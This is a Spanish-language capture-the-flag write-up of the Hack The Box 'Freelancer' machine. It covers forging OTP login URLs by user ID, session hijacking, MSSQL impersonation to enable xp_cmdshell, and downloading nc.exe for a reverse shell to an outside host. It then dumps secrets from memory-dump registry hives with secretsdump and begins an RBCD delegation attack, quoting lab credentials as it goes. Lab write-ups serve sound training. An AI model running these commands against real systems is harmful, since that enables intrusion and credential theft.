---
title: Freelancer
---

## Enumeracion

Ultimamente me he obsesionado con el directorio activo, por eso es que practicamente todas por no decir todas las maquinas medum y hard son de directorio activo, como ya hemos visto en las anteriore podemos darnos cuenta que es un directorio activo, pero esta ves esta aplicando virtualhosting. 

![nmap](../../../../../assets/Freelancer/nmap.png)

Para aplicar el virtualhosting y nuestro equipo sepa a donde redirigir la IP, vamos a añadir lo a nuestro archivo `/etc/hosts`. Primero enumeremos la maquina ver si hay credenciales filtradas por algun lado.O si podemos encontrar algo si estan compratiendo recursos.


![smb](../../../../../assets/Freelancer/smb.png)

No tenemos recursos compratidos, ni podemos acceder con credenciales nulas, algo a destacar es que el nombre del equipo es DC 'Domain Controler', pero no podemos rascar nada mas de aca. A si que vamos analizar la pagina que tiene, porque estube enumerando un poco y no habia nada.

#### Analizando pagina web

![web](../../../../../assets/Freelancer/paginaweb.png)

Echando un vistazo por la pagina, he realizado fuzzing, pero no encontre varias rutas pero ninguna muy relevante, en los subdomnios no encontramos absolutamente nada. a si que vamos a registranos como Freelancers. 

![regi](../../../../../assets/Freelancer/freelogin.png)

Este registro es un martirio, intente a ver si era para acontecer una injeccion sql o algo pero no, intentaba conectarme con el olvido de contraceña y esas cosas pero no, nada nada. A si que ahora probaremos si como empleador podemos conectarnos.

![emplo](../../../../../assets/Freelancer/emplyer.png)

Es exactamente el mismo logueo, aunque no me quedaba mas opcion de registrar me como empleador. Ten cuidado a la hora de hacer el registro y usar el mismo usuario porque queda guardado... te evito un tiempo, cuando intentes entrar te va a decir que no haz confirmado la cuenta pero restableces la contraceña y ya estaria.

![dash](../../../../../assets/Freelancer/dashboard.png)


### Codigo Qr

Navegando por la pagina, encontre una seccion donde se generaba un codigo Qr el cual se actualiza cada 5 minutos para poder acceder sin loguearnos desde nuestro celular a siq ue vamos analizar que tiene este codigo utilizando [zbarimg](# 'Herramienta de línea de comandos para leer y decodificar códigos de barras y QR desde imágenes o streams.'). El resultado es una URl 

![zbar](../../../../../assets/Freelancer/zbarimg.png)

Es una URl que consta, de un base64 y un hash en md5 parece ser, al decodificar el base64 nos encontramos con un numero.

```
echo 'MTAwMTE=' | base64 -d;echo
10011
```

Esto me hace pensar que puede ser un identificador de usuario, como podemos comprobar esto...

Primero veamos como se genera el codigo QR.

![qr1](../../../../../assets/Freelancer/qrgenerate.png)

Esto es critico porque lo que esta haciendo es generar un qr aleatorio y luego encriptando en base64 pone el id. Comprobemos si es verdad.

```bash
curl "http://freelancer.htb/accounts/otp/qrcode/generate/" -b "sessionid=rb9k2wctizogm1e6gw3vk0ky09bkfi53" -o- > qr.img 2>/dev/null && zbarimg qr.img 2>/dev/null | cut -d ':' -f 2-
```
```
http://freelancer.htb/accounts/login/otp/MTAwMTE=/750b34c9c2dc06da241075df48779ca9/
```
Esto nos devulve de nuevo el URl vamos a retocarlo para mandar le el Id de un usuario anterior, a si confirmaremos la deduccion anterior. 

```
echo 10010 | base64
MTAwMTAK
```
Modificamos la URl

```
http://freelancer.htb/accounts/login/otp/MTAwMTAK/750b34c9c2dc06da241075df48779ca9/
```

![atr4x](../../../../../assets/Freelancer/atr4x.png)

Como sospechabamos, tenemso acceso al usuario que creeamos antes al que no pudimos entrar :O, veamos ahora como nos la podemos arreglar para conseguir la url.

### Craft Script  

```bash
#!/bin/bash

for i in $(seq 1 888);do
  http=$(curl "http://freelancer.htb/accounts/otp/qrcode/generate/" -b "sessionid=i1dyi0h2sg2exwmgh6dfjem3lt8etdi1" -o- > qr.img 2>/dev/null && zbarimg qr.img 2>/dev/null | cut -d ':' -f 2-  | sed "s/MTAwMTE=/$(echo $i | base64)/")
  
   
    header=$(curl -s -D - -o /dev/null "$http" | grep -i "Set-Cookie")
    if [ -n  "$header" ]; then
      echo -e "\n-----------INFO------------"
      echo -e "\nURl -> $http\n"
      echo "$header"  
      echo "ID valid user -----> $i"
      echo -e "---------------------------\n"
    
      sleep 7
    fi
done
```
Ya que hemos descubierto que podemos listar usuarios intente hacerlo desde el mil pero no encontre nada a si que pense que lo mas logico era hacer lo desde el 1, esto funciono a la perfeccion pero no podia acceder con la url, el token expiraba.

![url](../../../../../assets/Freelancer/url.png)

A si que hay fue donde tome la desicion de enumerar los por la cookie de session a ver si podia aconteserce un [Session hijacking](# 'Secuestro de sesión: ataque que toma control de una sesión autenticada robando o usurpando su identificador (cookie/token) para acceder como el usuario legítimo.').

![script](../../../../../assets/Freelancer/script.png)

Tenemos dos cookies, pero claramente la que vamos a usar es la `sessionid`, a si que empece con el que usaba el usuario Nº 2.

### Session hijacking

Para poder secuestrar la sesion tenemos que ir a la pagina y dar click derecho, inspeccionar, en storage veremos las cookies que estan almacenadas. 

![hijacking](../../../../../assets/Freelancer/hijacking.png)

Cambiamos la segunda linea y le damos crt+r...


![admin](../../../../../assets/Freelancer/admin.png)

Estamos dentro de la sesion del administrador, estuve mirando un poco la pagina peor no veia nada relevante solo que ahora era el admin a si que se me ocurrio que ahora podria haber mas rutas comunes a las que podemos acceder con esa cookie de session.

```bash
ffuf -u 'http://freelancer.htb/FUZZ' -H 'Set-Cookie: sessionid=i7qaceh7r3povwl318x093nnj80db80h' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

```

![ffuf](../../../../../assets/Freelancer/ffuf.png)

Me intuia que esta path podia ser posible, pero era posible que hubiese mas, en esta ruta encontraremos un panel administrativo en condiciones.

![panel](../../../../../assets/Freelancer/panel.png)

## Jugando con MMSSQL

```
SELECT name FROM master.sys.databases
```
![databases](../../../../../assets/Freelancer/databases.png)

Vemos las bases de datos que hay.

```
SELECT name FROM sys.syslogins
```
![names](../../../../../assets/Freelancer/names.png)

Ahora probaria si tenemos ejecucion remota de comandos.

Probe tambien con la ejecucion remota de comandos y darles el valor de 1 a, _xp_cmdshell_ _show advanced options_. Pero no fue posible, en estos casos una opcion seria usar 'IMPERSONATE', que seria la suplantacion de identidad o permisos de otro usuario a si que probemos si es posible.

##### Impersonate

La mejor guia para enumerar y hacer pentesting a una base de datos MSSQL esta en, [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html) aca nos enseñan como enumerar todo a la perfeccion, personalmente no he encontrado guia mas completa que esta. A si que empecemos verificando si hay algun usuario que podamos suplantar 

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![sa](../../../../../assets/Freelancer/sa.png)

Ya  podemos suplantar al usuario SA

```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

La respuesta es sa asi que vamos bien encaminados. Lo que tenemos ahora es que podemos suplantar a sa y que estamos como _Freelancer_webapp_user_ a si que metamos a nuestro usuario en este grupo.

```
EXECUTE AS LOGIN = 'sa'
EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin'
```
Nos devolvera `No results. Previous SQL was not a query.` pero es normal ahora lo confirmaresmo con.

```
SELECT IS_SRVROLEMEMBER('sysadmin');

```

Nos deveria devolver un 1. Aqui la base de datos se comporta bastande raro, ya que tenemos que hacer todo demasiado rapido o sino, no podremos ejecutar corrrectamente los comandos, tendremos que ejecutar los comandos varias veces ya que la configuracion nos hace ir a contra reloj.

Ya estamos en el grupo `sysadmin` a si que ya podemos reconfigurar la. Empecemos con lo basico

```
sp_configure 'show advanced options', '1'
RECONFIGURE
```
Nos devolvera el mensaje de que no hay respuesta pero es completamente normal, la accion se esta haciendo. Seguimos

```
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```
Y ahor aconfirmemos si realmentelo que hicimos fuinciono con un...

```
EXEC xp_cmdshell 'whoami'
```
Y EFECTIVAMENTE TENEMOS LA EJECUCION REMOTA DE COMANDOS. Ahora lo que nos importa es establecer una reverse shell y como hemos echo en maquinas pasadas usaremos [nishang](# 'Framework en PowerShell con scripts y payloads para pentesting, post-explotación y red team en sistemas Windows.'). Pero me resulto imposible colarlo,  primero falle en la decodificacion de windowos y muchas cosas mas. Me resulto muy extraño que no pudiera ejecutar lo a si que luego al final de este writeup les mostrare como S4vitar elude por completo el defender. 

En otras ocaciones hemos abusado de la ejecucion de comandos para poder subir ejecutables tales como el nc.exe, netcat, payloadas echos con metaexploit y a si. Metaexploit ya no se usa, preparandonos para la oscp, a si que que lo mas eguro para hacer es usar nc.exe y probar si podemos ejecutarlo. Podemos subir lo al directorio temp pero primero veamos si cumplimos los requisitos.

- **Comprobar si tenemos trafico de red entre la base de datos y nuestra maquina**

Para esto usaremos ping en labase de datos victima y [tcpdup](# 'Sniffer en línea de comandos que captura y muestra paquetes de red en una interfaz, útil para analizar tráfico y diagnosticar problemas.') en nuestro equipo.

![tcpdump](../../../../../assets/Freelancer/ping1.png)

Aca ya podemos observar que si hay trafico de red, pero veamos si resivimos en nuestra maquina alguna traza.

![tcpdump](../../../../../assets/Freelancer/ping2.png)

- **Ver si la maquina atacante tiene Curl instalado**

![curl](../../../../../assets/Freelancer/curl.png)

###### Subiendo nc64.exe

Vale ya nos hemos serciorado que tenemos todo lo necesario para poder subir archivos, vamos abusar del archivo temp para subirlo y poder ejecutarlo y roguemos que no de problemas.

- Montemos nuestro servidor web con python para poder compartir el archivo 
- Una vez lo hemos montado podemos dirigirnos denuevo a la consola de la base de datos, habilitar las opciones avanzsadas y xp_cmdshell. Rapidamente ponemos el siguiente comando 

```
exec xp_cmdshell 'curl http://10.10.14.11/nc64.exe -o "%TEMP%\nc64.exe"'
```
La respuesta tendria que ser algo como esto, si no hiciste algo mal. Veamos si quedo bien guradado.

```
EXEC xp_cmdshell 'dir %TEMP%'
```

![curl1](../../../../../assets/Freelancer/dir.png)

Ya tenemos el archivo en el directorio temporal, tambien tenemos curl y trafico de red. Establezcamos una reverse.

Recuerden que para ponerte en escucha y  entablar conexion remota con una maquina windows, usamos rlwrap para que a la hora de tener una consola interactiva podamos tener un historial, usar Ctrl+l,  las flechas y demas.

```
rlwrap -cAr  nc -nlvp 888
```
Y en la consola de la base de datos ejcutaremos una coneccion netcat comun y corriente, añadiendole `-e cmd` para que netcat entienda que tiene que ejecutar ese programa cuando entable una conexion. 

```
EXEC xp_cmdshell '%TEMP%/nc64.exe 10.10.14.11 888 -e cmd'
```

### Usuario mikasaAckerman

Establecemos conexion como el usuario `sql_svc`, al hacer un ipconfig confirmamos que estamos dentro de la maquina victima. 

![ipconfig](../../../../../assets/Freelancer/ipconfig.png)

Intente buscar en el Desktop la flag de usuario pero nooo aun no estamos como el usuario que nos dara puertas a rootear la maquina, a siq eu empece a buscar en el directorio del usuario y encontre varias cosas interesantes, dentro de las descargas hay un archivo llamado `SQLEXPR-2019_x64_ENU`, en su interior tien bvarios archivos pero hay uno que en general siempre llama la atencion.

![sqlexp](../../../../../assets/Freelancer/sqlexp.png)

Por lo general, por no decir casi siempre los archivos de configuracion tiene las contraceñas en texto claro.

![passwd](../../../../../assets/Freelancer/passwords.png)

Obtenemos dos contraceñas en texto claro, a si que ahora saquemos una lista de usuarios que la puedes conseguir muy facilmente usando el net users y nos listara todos los usuarios del sistema, ahora solo lo tenemos que hacer una lista para usar con NetExec.

![users](../../../../../assets/Freelancer/users.png)

Para hacer una lista lo guardas en un arcivo llamdo users y usas Tr para organizar lo.

```
cat users | tr -s ' ' '\n'
```
Una ves ya tenemos nuestra lista procedemos a buscar el dueño de la primera contraceña usando netexec.

```
nxc smb 10.10.11.5 -u users -p 'IL0v3ErenY3ager'
```
![mikasa](../../../../../assets/Freelancer/mikasa.png)

Pertenece al usuario mikasaAckerman liste lños archivos compartidos pero no habia absolutamente nada interezante, tampoco pertenece al grupo de acceso remoto a siq ue en estos casos lo que se hace antes de seguir intentando acceder de otra manera, es usar RunasCs.exe, esto nos permite ejecutar procesos usando credenciales explicitas  de otro usuario.

Esta herramienta la puedes descargar desde el mismo [repositorio](https://github.com/antonioCoco/RunasCs)  y su uso es bastante sencillo leyendo un poco el --help sabras el modo de empleo, se me olvido pero la otra contraceña no pertenece a ningun usuario a si que ya esta. Subimos el .exe con curl montando el servidor web python.

Para usarla nos entablaremos una revershell con el usuario al que le tenemos las credenciales, nos pondremos en escucha desde otra terminal usando de nuevo rlwrap y desde la maquina victima mandaremos esa reverseshell.

```
RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.11:444
```
![mika](../../../../../assets/Freelancer/mika.png)

este usario si que tiene la flag en el escritorio :).

## Escalando privilegios

En el mismo Desktop encontramos dos archivos mas, uno es un correo en el cual sereporta que devido a un error provocado por la actualizacion se ha enviado un volcado de la memoria y se te ha enviado. 

En este momento es conveniente descargarnos el volcado que es un .7z,hay muchas maneras de hacerlo. pero esta es la que aprendi hace años y la verdad es que nunca da problemas, pienso que es la mejor manera de aprenderla y que funcione en cualquier equipo.

###### Compartiendo archivos con impacket-smbserver

El funcionamiento es el siguiente, levanataremos un servidor **SMB** para compartir archivos.

```
impacket-smbserver <nombreSMB> $(pwd) -smb2support -username <name> -password <password>

```

Luego desde la maquina victima, haremos dos movimientos, primero montaremos nuestro recurso SMB.

```
net use \\10.10.11.5\<nombreSMB> /u:<name> <pass>
```

![mySMB1](../../../../../assets/Freelancer/mySMB1.png)

Esto nos indica que nos hemos conectado correctamente y departe de nuestro servidor SMB montado veremos lo siguiente.

![mySMB2](../../../../../assets/Freelancer/mySMB2.png)

Esto nos indica que ya estamos conectados, ahora ya podremos copiar el archivo `memory.7z` en nuestro pc.

```
copy MEMORY.7z \\10.10.14.11\mySMB\MEMORY.7z
```
Esto empezara a descargar el archivo, es bastante grande a si que tengan calma, mientras se termina de descargar veamos que es un dumpeo de memoria

### Memory DUMP 

El dumpeo de memoria es una copia completa del contenido de la memoria RAM del sistema. En este caso lo hacen para que un analista pueda recontruir el estado del sitema justo antes del fallo y identificar la causa, para nosotros del lado del atacante nos viene perfecto ya que podemos aprovecharnos y sacar informacion confidencial.

- **¿Como podemos tratarlo desde nuestro equipo?**

Para el tratamiento de nuestro dumpeo, estaremos usando [MemProcFS](https://github.com/ufrisk/MemProcFS) que es una herramienta forence, utilizada para montar y analizar un memory dump o la misma memoria viva de un sistema como si fuera un sitema de archivos virtual en linux.

- **¿Como se usa?**

Primero tenemos que descomprimir, nuestro archivo .7z, el archivo es muy pesado a si que tocara esperar un poco.

```
7z x MEMORY.7z
```

Ahora nos queda crear el directorio en la ruta tmp, yo lo llamare `/tmp/brain_dump` y ahi montaremos todo nuestro sistema de archivos. Para poder analizar lo de una manera mucho mas optima 

```
./memprocfs -device MEMORY.DMP -mount /tmp/brain_dump
```
Esto tomara como dispositivo el descompirmido de memory.7z y lo montara en un sistema de archivos mucho mas sencillo de analizar en la rutya que le acabamos de especificar.

- **Analizando la montura**

Cuando nos dirigimos a `/tmp/brain_dump/`, nos encontraremos con la estrucura tipica que genera memprocfs, basicamente divide de la siguiente manera.



-    **name/ y pid/** → son tus mejores amigos para buscar procesos.
-    **registry/** → para credenciales y configuraciones.
-    **sys/** → para drivers y rootkits.
-    **forensic/ y misc/** → para metadatos y contexto.

En este momento lo que mas nos intereza es encontrar credenciales y poder seguir desplazandonos lateralmente por la maquina a si que echemos le un vistazo a **registry/**


### Impacket-secretsdup 

Esta herramienta nos permite como su nombre lo dice extraer secretos de windows, desde archivos offline (SAM/SYSTEM/NTDS) y de varias cosas mas, pero ahora mismo es la funcion que nos intereza, dentro de el archivo registry/hive_files encontraremos dos archivos, uno SAM y el otro SECURITY.

![secretDUMP](../../../../../assets/Freelancer/secretdump.png)

Con esta informacion podemos empezar a jugar, para usar este impacket, empezemos con el archivo SAM

```
impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive  -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive LOCAL
```
Tenemos que pasar le el archivo system tambien ya que estamos en un analisis local, a si que mucho ojo con eso.

![SAM](../../../../../assets/Freelancer/SAM.png)

He de reconocer que me ilucione con el hash del administrador, pero NOOO, fue solo una trampa, al probar lo con netexec encontre que no era valido y no podiamos hacer el passTheHash a sique nos quedab aun inspeccionar el archivo SECURITY.

```
impacket-secretsdump -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive  -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive LOCAL
```
Es el mismo procedimiento que con el archivo sam, esto nos informa de una nueva credencial. `PWN3D#l0rr@Armessa199` vamos a probar con nxc, a ver si hay algun usuario al qie corresponda esta password

![SDUMP](../../../../../assets/Freelancer/sdump.png)

### Entrando como el usuario lorra199

![lorra199](../../../../../assets/Freelancer/lorra.png)

La contaceña que encontramos pertenece al usuario lorra199 y en efecto tenemos acceso remoto a ella

![pwn3d](../../../../../assets/Freelancer/pwned.png)

### BloodHound

Para escalar hasta el administrador estaremos usando BloodHound, busque la relacion que existe entre _lorra199_ y el _Administrator_ y tenemos un path a seguir, podemos escalar.

![BloodHound](../../../../../assets/Freelancer/bloodhount.png)

Empecemos, lo primero que tendremos que hacer es crear un SPN(Identificador de kerberos que asocia un servicio con una cuenta en el AD).

```
impacket-addcomputer -method SAMR -computer-name 'Atr4x$' -computer-pass 'Summer2018!' -dc-host 10.10.11.5 -domain-netbios freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```
Tenemso que modificar el method porque o sino entra en conflicto con los permisos ssl. ¿Para que hacemos esto? Lo hacemos para conseguir un TGS 

```
impacket-rbcd -delegate-from 'Atr4x$' -delegate-to 'dc$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```


